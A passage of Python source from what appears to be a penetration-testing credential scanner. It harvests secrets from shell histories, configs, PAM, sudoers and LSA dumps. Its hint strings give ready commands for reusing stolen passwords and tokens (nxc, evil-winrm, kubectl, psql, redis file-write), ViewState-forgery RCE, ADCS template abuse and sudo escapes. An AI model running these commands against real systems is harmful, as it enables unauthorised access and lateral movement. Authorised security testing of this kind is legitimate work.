                    # iter-189: CREATE USER 'x' IDENTIFIED BY 'y' - user + pw pair.
                    if name == "SQL CREATE USER":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or _is_cli_placeholder(u):
                            continue
                        _u_sh_cu = u.replace("'", "'\\''")
                        _pw_sh_cu = pw.replace("'", "'\\''")
                        # detect flavor: PostgreSQL, MySQL/MariaDB
                        is_pg = "WITH PASSWORD" in line.upper()
                        _db = "postgres" if is_pg else "mysql"
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"SQL CREATE USER: {u}:{pw}",
                                   hint=(f"{_db} -u '{_u_sh_cu}' -p"
                                         f"{'' if not is_pg else ''}"
                                         f"  |  reuse as OS/service cred: "
                                         f"nxc smb <host> -u '{_u_sh_cu}' "
                                         f"-p '{_pw_sh_cu}'"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-193: opaque-token prefix detector (broader than
                    # iter-185's Bearer-only form). Same provider mapping
                    # so the hint routes to the right tooling. CRITICAL
                    # since these are account-wide keys.
                    if name == "opaque token prefix":
                        tok = am.group(1)
                        # Provider inference from prefix (mirrors iter-185).
                        prefix = tok[:2]
                        if tok.startswith("SG."):
                            prefix = "SG"
                        elif tok.startswith("github_pat_"):
                            prefix = "gi"
                        _PROVIDER_HINTS_LINE = {
                            "gh": ("GitHub PAT",
                                   "gh api /user OR curl -H "
                                   "'Authorization: token <tok>' "
                                   "https://api.github.com/user"),
                            "gl": ("GitLab PAT",
                                   "curl -H 'PRIVATE-TOKEN: <tok>' "
                                   "https://gitlab.example/api/v4/user"),
                            "sk": ("OpenAI API key",
                                   "billing risk; flag as intel, do NOT "
                                   "hit live endpoint on exam"),
                            "xo": ("Slack token",
                                   "SlackPirate / slack-audit enumeration"),
                            "nt": ("Notion integration token", "flag intel"),
                            "sq": ("Square API token", "flag intel"),
                            "do": ("DigitalOcean token",
                                   "doctl auth init -t <tok>"),
                            "nv": ("NVIDIA API key", "flag intel"),
                            "SG": ("Sendgrid API key",
                                   "phish-vector; flag intel"),
                            "pa": ("Airtable PAT", "flag intel"),
                            "gi": ("GitHub fine-grained PAT",
                                   "curl -H 'Authorization: token <tok>' "
                                   "https://api.github.com/user"),
                        }
                        provider, phint = _PROVIDER_HINTS_LINE.get(prefix,
                            ("opaque bearer token", "flag intel"))
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"{provider}: {tok[:35]}"
                                   f"{'...' if len(tok) > 35 else ''}",
                                   hint=phint)
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=tok,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-193: PAM misconfig - `pam_permit.so` or `nullok`.
                    # File-gated to /etc/pam.d/ paths. Emits HIGH RECON with
                    # the specific privesc primitive noted in the hint.
                    if name == "PAM misconfig":
                        if "/etc/pam.d/" not in path.replace("\\", "/"):
                            continue
                        stage = am.group(1)
                        primitive = am.group(2)
                        _base_pam = os.path.basename(path).lower()
                        _svc = _base_pam  # sshd/common-auth/su/sudo/etc.
                        if "pam_permit.so" in primitive:
                            _label = "pam_permit.so at auth stage"
                            _hint = (f"pam_permit.so ALWAYS succeeds; login "
                                     f"as ANY user to '{_svc}' service with "
                                     f"anything. ssh <user>@<host>  |  su <user>")
                        else:  # nullok
                            _label = f"pam_unix.so with 'nullok' (empty pw allowed)"
                            _hint = (f"empty-password auth enabled on '{_svc}'. "
                                     f"users with no pw set can log in "
                                     f"unauthenticated: ssh <user>@<host> "
                                     f"(when prompted, press Enter)")
                        report.add("HIGH", "RECON", path, lineno,
                                   f"PAM ({_svc}): {_label}",
                                   hint=_hint)
                        hit = True
                        break
                    # iter-189: Slack / Discord / Teams IncomingWebhook URLs.
                    # The full URL IS the secret - anyone with it posts as the
                    # webhook identity. Great for phishing / lateral pivoting on
                    # DevOps-heavy engagements (with explicit scope).
                    if name in ("Slack webhook URL", "Discord webhook URL",
                                "Teams webhook URL"):
                        url = am.group(0)
                        # Reject obvious placeholder / all-zero / all-X URLs
                        # (docs "your token here" filler).
                        _tail = url.rsplit("/", 1)[-1]
                        if (re.fullmatch(r'[0Xx]+', _tail)
                                or "your-token" in url.lower()
                                or "YOUR_TOKEN" in url):
                            continue
                        provider = name.split()[0]
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{provider} webhook URL: {url[:80]}"
                                   f"{'...' if len(url) > 80 else ''}",
                                   hint=(f"phish/notif post: curl -X POST -H "
                                         f"'Content-Type: application/json' "
                                         f"-d '{{\"text\":\"test\"}}' '{url}'  "
                                         f"(with explicit scope; do NOT hit on "
                                         f"exam without permission)"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=url,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "SNMP community":
                        kind, comm, source = am.group(1), am.group(2), (am.group(3) or "")
                        if filters.is_placeholder(comm):
                            continue
                        rw = kind.lower().startswith("rwcommunity")
                        sev = "CRITICAL" if rw else "HIGH"
                        report.add(sev, "ASSIGNED SECRETS", path, lineno,
                                   f"SNMP {kind}: {comm}" + (f"  ({source})" if source else ""),
                                   hint=("snmpwalk -v2c -c '" + comm + "' <host>  " +
                                         ("(read-WRITE - snmpset for direct config tampering)" if rw
                                          else "(read-only enum: walk full tree)")))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=comm, source=path, line=lineno))
                        hit = True
                        break
                    if name == "docker env secret":
                        # iter-13 severity normalization: matches the HIGH
                        # baseline for the rest of the assigned-secret family
                        # (Helm/tfvars/PHP define/generic 1-group fall-through).
                        var, val = am.group(1), am.group(2).strip()
                        if filters.is_placeholder(val) or filters.is_known_example(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"{var}: {val}",
                                   hint="container/orchestration secret - reuse directly against the service")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val, source=path, line=lineno))
                        hit = True
                        break
                    if name == "cmdkey history":
                        pw = am.group(1).strip()
                        if filters.is_placeholder(pw):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"cmdkey history password: {pw}",
                                   hint="typed in PowerShell - reuse against the host in the same cmdkey line / via SMB")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw, source=path, line=lineno))
                        hit = True
                        break
                    if name == "ASP.NET machineKey":
                        vk, dk = am.group(1), am.group(2)
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"ASP.NET machineKey  validationKey={vk[:32]}{'...' if len(vk)>32 else ''} "
                                   f"decryptionKey={dk[:32]}{'...' if len(dk)>32 else ''}",
                                   hint="ViewState forgery: ysoserial.net + these keys -> RCE (CVE-2017-9248-class)")
                        hit = True
                        break
                    # SCCM NAA handled by _multiline_passes() (two-line block)
                    if name == "LSA secret":
                        if am.group(1):  # $MACHINE.ACC : LM:NT
                            pair = am.group(1)
                            nt = pair.split(":")[1]
                            report.add("HIGH", "PASSWORD HASHES", path, lineno,
                                       f"NTLM (NT) $MACHINE.ACC: {nt}",
                                       hint=f"machine account hash - silver/golden-ticket primitive: nxc smb <dc> -u 'HOSTNAME$' -H {nt}")
                            from analyzers.patterns import HASHES
                            HASHES.append(("1000", "NTLM", nt, path, lineno))
                        elif am.group(2) and am.group(3):
                            u, p = am.group(2), am.group(3)
                            report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                       f"LSA SCM service cred: {u}:{p}",
                                       hint="service account password recovered from LSA secrets - reuse against the host")
                            if store is not None:
                                from analyzers.ingest.evidence import Evidence
                                store.add(Evidence(kind="plaintext", user=u, plaintext=p, source=path, line=lineno))
                        hit = True
                        break
                    # ---- iter-8 round-1 dispatch ----
                    if name == "Certipy template ESC":
                        tmpl, vuln = am.group(1).strip(), am.group(2).strip()
                        report.add("HIGH", "RECON", path, lineno,
                                   f"ADCS template '{tmpl}' vulnerable: {vuln}",
                                   hint=f"certipy-ad req -ca <CA> -template '{tmpl}' -upn administrator@<dom> -u <you> -p <pw>")
                        hit = True
                        break
                    if name == "pg_hba auth method":
                        host_typ, db, user, method = am.group(1), am.group(2), am.group(3), am.group(5)
                        if method == "trust":
                            sev = "CRITICAL" if host_typ.startswith("host") else "HIGH"
                            report.add(sev, "ASSIGNED SECRETS", path, lineno,
                                       f"pg_hba TRUST auth: {host_typ} {db} {user}",
                                       hint=f"psql -U {user} -d {db} -h <pg-host>  (NO password required)")
                            hit = True
                            break
                    if name == "redis requirepass":
                        directive, val = am.group(1), am.group(2)
                        if filters.is_placeholder(val):
                            continue
                        report.add("HIGH", "ASSIGNED SECRETS", path, lineno,
                                   f"redis {directive}: {val}",
                                   hint=f"redis-cli -h <host> -a '{val}' info")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=val, source=path, line=lineno))
                        hit = True
                        break
                    # iter-26: shell history typed-cred dispatchers.
                    if name == "bash history mysql -p":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or pw.startswith("$"):
                            continue
                        # iter-175: shell-escape u + pw.
                        _u_sh_my = u.replace("'", "'\\''")
                        _pw_sh_my = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history MySQL: {u}:{pw}",
                                   hint=f"mysql -h <host> -u '{_u_sh_my}' -p'{_pw_sh_my}'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "bash history sshpass -p":
                        pw, target = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or pw.startswith("$"):
                            continue
                        u = target.split("@", 1)[0] if "@" in target else ""
                        # iter-175: shell-escape pw (target is
                        # user@host - shell metachars unlikely there).
                        _pw_sh_sp = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history sshpass: {u}:{pw} -> {target}",
                                   hint=f"sshpass -p '{_pw_sh_sp}' ssh {target}")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "bash history curl -u":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or pw.startswith("$") or u == "user":
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history curl basic-auth: {u}:{pw}",
                                   hint=f"curl -u '{u}:{pw}' <url>")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "bash history wget --user":
                        u, pw = am.group(1), am.group(2)
                        if filters.is_placeholder(pw) or pw.startswith("$"):
                            continue
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history wget: {u}:{pw}",
                                   hint=f"wget --user='{u}' --password='{pw}' <url>")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-182: impacket family (DOMAIN/user:pass@host). Was
                    # psexec-only; now covers wmiexec/smbexec/atexec/dcomexec/
                    # secretsdump/getST/getTGT/getUserSPNs/GetNPUsers/lookupsid/
                    # rpcdump/mssqlclient, all with impacket- prefix or bare
                    # .py form. Emit CRED PAIRS + Evidence so downstream chains
                    # can immediately reuse the pw.
                    if name == "impacket inline":
                        dom, u, pw, tgt = (am.group(1) or "",
                                           am.group(2), am.group(3),
                                           am.group(4))
                        if (filters.is_placeholder(pw) or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_ik = u.replace("'", "'\\''")
                        _pw_sh_ik = pw.replace("'", "'\\''")
                        _who = (dom + "/" + u) if dom else u
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history impacket cred: {_who}:{pw}"
                                   f"  -> {tgt}",
                                   hint=(f"reuse: nxc smb {tgt} -u '{_u_sh_ik}'"
                                         f" -p '{_pw_sh_ik}'"
                                         + (f" -d {dom}" if dom else "")))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, host=tgt,
                                               domain=dom, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-182: PGPASSWORD='p@ss' psql -U alice -h host -d db.
                    # Group 1 is pw; optional group 2 is -U user (may be absent
                    # when PGPASSWORD is set in a Dockerfile / systemd unit
                    # without an inline psql invocation).
                    if name == "bash history PGPASSWORD":
                        pw = am.group(1)
                        u = am.group(2) or ""
                        if filters.is_placeholder(pw) or pw.startswith("$"):
                            continue
                        _pw_sh_pg = pw.replace("'", "'\\''")
                        _u_disp = u or "postgres"
                        _u_sh_pg = _u_disp.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history PGPASSWORD: {_u_disp}:{pw}",
                                   hint=(f"PGPASSWORD='{_pw_sh_pg}' psql -U "
                                         f"'{_u_sh_pg}' -h <pg-host>  |  also try "
                                         f"as OS user pw: ssh {_u_disp}@<host>"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext",
                                               user=(u or None),
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-182: MYSQL_PWD='p@ss' mysql -u root -h host. Same
                    # shape as PGPASSWORD. Default user is 'root' when the
                    # -u flag isn't on this line (mysql default).
                    if name == "bash history MYSQL_PWD":
                        pw = am.group(1)
                        u = am.group(2) or ""
                        if filters.is_placeholder(pw) or pw.startswith("$"):
                            continue
                        _pw_sh_my2 = pw.replace("'", "'\\''")
                        _u_disp_my = u or "root"
                        _u_sh_my2 = _u_disp_my.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history MYSQL_PWD: {_u_disp_my}:{pw}",
                                   hint=(f"MYSQL_PWD='{_pw_sh_my2}' mysql -u "
                                         f"'{_u_sh_my2}' -h <mysql-host>  |  "
                                         f"also try as OS user pw"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext",
                                               user=(u or None),
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-182: nxc/netexec/crackmapexec/cme -u X -p Y. Standard
                    # foothold-hunting shape in modern OSCP+ walkthroughs.
                    if name == "bash history nxc/cme":
                        u, pw = am.group(1), am.group(2)
                        if (filters.is_placeholder(pw) or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_nx = u.replace("'", "'\\''")
                        _pw_sh_nx = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history nxc/cme: {u}:{pw}",
                                   hint=(f"reuse: nxc smb <host> -u '{_u_sh_nx}' "
                                         f"-p '{_pw_sh_nx}' ; also winrm/ldap/mssql"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-187: redis-cli -a 'pw'. Redis default user is
                    # 'default' on Redis 6+; hint mentions ACL check.
                    if name == "bash history redis-cli":
                        pw = am.group(1)
                        if filters.is_placeholder(pw) or pw.startswith("$"):
                            continue
                        _pw_sh_rc = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history redis-cli: default:{pw}",
                                   hint=(f"redis-cli -h <host> -a '{_pw_sh_rc}' "
                                         f"info  |  ACL USER LIST (Redis 6+); "
                                         f"CONFIG GET dir + slaveof / SET dir "
                                         f"/root/.ssh for auth-bypass write-file"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext",
                                               user="default", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-187: mongo/mongosh -u X -p Y.
                    if name == "bash history mongo -u":
                        u, pw = am.group(1), am.group(2)
                        if (filters.is_placeholder(pw) or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_mg = u.replace("'", "'\\''")
                        _pw_sh_mg = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history mongo: {u}:{pw}",
                                   hint=(f"mongosh 'mongodb://{_u_sh_mg}:"
                                         f"{_pw_sh_mg}@<host>:27017/?"
                                         f"authSource=admin'  |  role admin -> "
                                         f"db.adminCommand({{listDatabases:1}})"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-187: cqlsh -u X -p Y (Cassandra shell).
                    if name == "bash history cqlsh":
                        u, pw = am.group(1), am.group(2)
                        if (filters.is_placeholder(pw) or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_cq = u.replace("'", "'\\''")
                        _pw_sh_cq = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history cqlsh: {u}:{pw}",
                                   hint=(f"cqlsh <host> 9042 -u '{_u_sh_cq}' "
                                         f"-p '{_pw_sh_cq}'  |  SELECT * FROM "
                                         f"system_auth.roles; check role "
                                         f"'cassandra' for is_superuser=true"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-187: influx -username X -password Y (InfluxDB 1.x).
                    if name == "bash history influx":
                        u, pw = am.group(1), am.group(2)
                        if (filters.is_placeholder(pw) or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_in = u.replace("'", "'\\''")
                        _pw_sh_in = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history influx: {u}:{pw}",
                                   hint=(f"influx -host <host> -username "
                                         f"'{_u_sh_in}' -password '{_pw_sh_in}' "
                                         f" |  SHOW DATABASES; SHOW USERS"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-184: schtasks /create /RU X /RP Y.
                    if name == "bash history schtasks":
                        u, pw = am.group(1), am.group(2)
                        if (filters.is_placeholder(pw) or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_st = u.replace("'", "'\\''")
                        _pw_sh_st = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history schtasks: {u}:{pw}",
                                   hint=(f"scheduled-task service-account cred; "
                                         f"reuse: nxc smb <host> -u '{_u_sh_st}' "
                                         f"-p '{_pw_sh_st}'  |  or evil-winrm"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-184: kubectl config set-credentials NAME --token=X.
                    if name == "bash history kubectl set-cred token":
                        cred_name, tok = am.group(1), am.group(2)
                        if (filters.is_placeholder(tok) or tok.startswith("$")
                                or len(tok) < 20):
                            continue
                        _tok_sh = tok.replace("'", "'\\''")
                        _name_sh = cred_name.replace("'", "'\\''")
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"shell history kubectl token '{cred_name}': "
                                   f"{tok[:40]}{'...' if len(tok) > 40 else ''}",
                                   hint=(f"kubectl --token='{_tok_sh}' --server "
                                         f"https://<apiserver>:6443 "
                                         f"--insecure-skip-tls-verify get pods -A"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=tok,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-184: kubectl config set-credentials NAME --username X
                    # --password Y (basic-auth K8s).
                    if name == "bash history kubectl set-cred pw":
                        cred_name, u, pw = am.group(1), am.group(2), am.group(3)
                        if (filters.is_placeholder(pw) or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_kc = u.replace("'", "'\\''")
                        _pw_sh_kc = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history kubectl basic-auth "
                                   f"'{cred_name}': {u}:{pw}",
                                   hint=(f"K8s basic-auth cred; try: kubectl "
                                         f"--username='{_u_sh_kc}' "
                                         f"--password='{_pw_sh_kc}' get pods -A"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-183: net use \\host\share pw /user:X.
                    if name == "bash history net use":
                        pw, u = am.group(1), am.group(2)
                        if (filters.is_placeholder(pw) or pw == "*"
                                or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_nu = u.replace("'", "'\\''")
                        _pw_sh_nu = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history net use: {u}:{pw}",
                                   hint=(f"Windows share mount pw; reuse: nxc smb "
                                         f"<host> -u '{_u_sh_nu}' -p '{_pw_sh_nu}'"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-183: az login --username X --password Y.
                    if name == "bash history az login":
                        u, pw = am.group(1), am.group(2)
                        if (filters.is_placeholder(pw) or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_az = u.replace("'", "'\\''")
                        _pw_sh_az = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history az login: {u}:{pw}",
                                   hint=(f"Azure CLI cred; validate offline "
                                         f"(check user domain / tenant); reuse "
                                         f"as O365 / M365 / Entra ID login: "
                                         f"az login -u '{_u_sh_az}' -p '{_pw_sh_az}'"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-183: docker login -u X -p Y [registry].
                    if name == "bash history docker login":
                        u, pw = am.group(1), am.group(2)
                        registry = am.group(3) or "docker.io"
                        if (filters.is_placeholder(pw) or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_dl2 = u.replace("'", "'\\''")
                        _pw_sh_dl2 = pw.replace("'", "'\\''")
                        _reg_sh = registry.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history docker login "
                                   f"{registry}: {u}:{pw}",
                                   hint=(f"docker login '{_reg_sh}' -u '{_u_sh_dl2}' "
                                         f"-p '{_pw_sh_dl2}'  - registry auth; "
                                         f"often reused for SSH/SMB"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-183: echo 'pw' | sudo -S <cmd>. Non-interactive sudo
                    # via stdin. The pw is right there in the echo arg.
                    if name == "bash history piped sudo -S":
                        pw = am.group(1)
                        if filters.is_placeholder(pw) or pw.startswith("$"):
                            continue
                        _pw_sh_ps = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history piped-sudo pw: {pw}",
                                   hint=(f"pw piped to `sudo -S` for non-interactive "
                                         f"root; try: echo '{_pw_sh_ps}' | sudo -S "
                                         f"-i  or ssh <op-user>@<host> pw '{_pw_sh_ps}'"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-182: evil-winrm -i <host> -u X -p Y (or flag order
                    # swapped). Standard WinRM foothold with a valid user cred.
                    if name == "bash history evil-winrm":
                        u, pw = am.group(1), am.group(2)
                        if (filters.is_placeholder(pw) or pw.startswith("$")
                                or _is_cli_placeholder(u)):
                            continue
                        _u_sh_ew = u.replace("'", "'\\''")
                        _pw_sh_ew = pw.replace("'", "'\\''")
                        report.add("CRITICAL", "CRED PAIRS", path, lineno,
                                   f"shell history evil-winrm: {u}:{pw}",
                                   hint=(f"reuse: evil-winrm -i <host> -u "
                                         f"'{_u_sh_ew}' -p '{_pw_sh_ew}'"))
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=u,
                                               plaintext=pw, source=path,
                                               line=lineno))
                        hit = True
                        break
                    # iter-26: /etc/passwd GECOS field with embedded pw hint.
                    if name == "etc passwd GECOS hint":
                        usr_, gecos = am.group(1), am.group(2)
                        tok = filters.extract_pw_from_desc(gecos)
                        if not tok or filters.is_placeholder(tok) \
                                or filters.is_code_not_literal(tok, gecos):
                            continue
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"/etc/passwd GECOS hints cred for {usr_}: {gecos[:60]}",
                                   hint=f"try: ssh '{usr_}@<host>'  password '{tok}'")
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=usr_, plaintext=tok,
                                               source=path, line=lineno))
                        hit = True
                        break
                    # iter-26: ~/.my.cnf / /etc/mysql/debian.cnf [client] block.
                    # The 'mysql client opt' regex captures `password = X`; pair
                    # it with the nearest preceding `user = X` to bind. Falling
                    # back to a generic record when user isn't in the same file.
                    # iter-31 FP fix: gate label to .my.cnf-shaped files -
                    # supervisord.conf / app.conf / mail.ini all have their
                    # own `password = X` which was mis-labeled as "MySQL"
                    # (still valid creds, just wrong provenance in the label).
                    if name == "mysql client opt":
                        pw = am.group(1).strip()
                        if filters.is_placeholder(pw) or filters.is_code_not_literal(pw, line):
                            continue
                        # look back up to 5 lines for a user= in same section
                        usr = "root"
                        try:
                            with open(path, "r", errors="ignore") as _fh:
                                _lines = _fh.readlines()
                            for back in range(max(0, lineno - 6), lineno - 1):
                                um = re.match(r'\s*user\s*=\s*["\']?([^"\'#\r\n]{1,40})',
                                              _lines[back])
                                if um:
                                    usr = um.group(1).strip()
                        except OSError:
                            pass
                        base = os.path.basename(path).lower()
                        is_mysql = ("my.cnf" in base or "mariadb" in base
                                    or "debian.cnf" in base
                                    or "/mysql/" in path.lower())
                        if is_mysql:
                            label = "MySQL .my.cnf cred"
                            hint_ = (f"mysql -h <host> -u '{usr}' -p'{pw}'  "
                                     f"(or auto: mysql --defaults-extra-file=<f>)")
                        else:
                            label = "config password= entry"
                            hint_ = (f"password from ini/conf: reuse '{pw}' as "
                                     f"service password; if user unknown try common")
                        report.add("HIGH", "CRED PAIRS", path, lineno,
                                   f"{label}: {usr}:{pw}", hint=hint_)
                        if store is not None:
                            from analyzers.ingest.evidence import Evidence
                            store.add(Evidence(kind="plaintext", user=usr, plaintext=pw,
                                               source=path, line=lineno))
                        hit = True
                        break
                    if name == "sudoers NOPASSWD":
                        user, cmd = am.group(1), am.group(2).strip()
                        # iter-215: consult _GTFOBINS_SUDO for the exact
                        # escape - falls back to a generic "sudo <bin>"
                        # hint when the binary isn't tabled.
                        _sudo_bin = cmd.split()[0] if cmd else "<cmd>"
                        _sudo_bn = os.path.basename(_sudo_bin)
                        _sesc = _GTFOBINS_SUDO.get(_sudo_bn)
                        if _sesc:
                            _hint = (f"as '{user}': {_sesc}  |  ref: "
                                     f"gtfobins.github.io/gtfobins/"
                                     f"{_sudo_bn}")
                        else:
                            _hint = (f"as '{user}' run: sudo {_sudo_bin}  "
                                     f"(check GTFOBins for escape)")
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"sudoers NOPASSWD  {user}  ->  {cmd[:80]}",
                                   hint=_hint)
                        hit = True
                        break
                    # iter-17 (corpus mine wkl2kkzn5): sudo -l output shape
                    # (no user/host prefix; indented '(runas) NOPASSWD: /path').
                    # Gate to plausibly-sudo-l files to skip code/doc FPs.
                    if name == "sudo -l NOPASSWD":
                        runas, cmd = am.group(1), am.group(2).strip()
                        base = os.path.basename(path).lower()
                        plow = path.lower()
                        if not ("sudo" in base or "priv" in base or "peas" in plow
                                or "linpeas" in plow or path.lower().endswith((".txt", ".log", ".md"))):
                            continue
                        if filters.is_doc_file(path):
                            continue
                        bin_path = cmd.split()[0] if cmd else "<cmd>"
                        # iter-215: same GTFOBins-sudo lookup as sudoers.
                        _bn = os.path.basename(bin_path)
                        _sesc = _GTFOBINS_SUDO.get(_bn)
                        if _sesc:
                            _hint = (f"{_sesc}  |  ref: "
                                     f"gtfobins.github.io/gtfobins/{_bn}")
                        else:
                            _hint = (f"sudo {bin_path}  "
                                     f"(gtfobins.github.io/gtfobins/{_bn}"
                                     f" - Sudo section)")
                        report.add("CRITICAL", "ASSIGNED SECRETS", path, lineno,
                                   f"sudo -l NOPASSWD (as {runas}) -> {cmd[:80]}",
                                   hint=_hint)
                        hit = True
                        break
                    # iter-17: Samba CVE-2007-2447 banner (HTB Lame)
                    if name == "Samba vuln banner":
                        if filters.is_doc_file(path):
